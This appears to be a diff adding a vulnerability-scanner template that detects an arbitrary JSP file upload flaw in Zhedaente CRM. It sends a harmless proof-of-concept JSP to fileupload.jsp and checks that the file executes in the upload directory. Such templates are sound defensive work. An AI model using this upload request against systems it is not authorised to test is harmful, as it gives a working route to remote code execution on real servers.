@@ -1,0 +1,43 @@
+id: zhedaente-entsoft-crmbasicaction-upload
+info:
+  name: Zhedaente CRM File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template checks for an arbitrary file upload vulnerability in the Zhedaente CRM system's fileupload.jsp endpoint, allowing attackers to upload and execute malicious JSP files.
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  t1: "{{rand_int(100,1000)}}"
+  t2: "{{rand_int(100,1000)}}"
+  t3: "{{to_number(t1) * to_number(t2)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/entsoft_en/entereditor/jsp/fileupload.jsp?filename={{filename}}.jsp"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "This website has a vulnerability!!!<% out.println({{t1}} * {{t2}}); %>"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: check-file
+    method: GET
+    path:
+      - "{{BaseURL}}/enterdoc/uploadfile/{{filename}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t3}}"
+          - "This website has a vulnerability!!!"
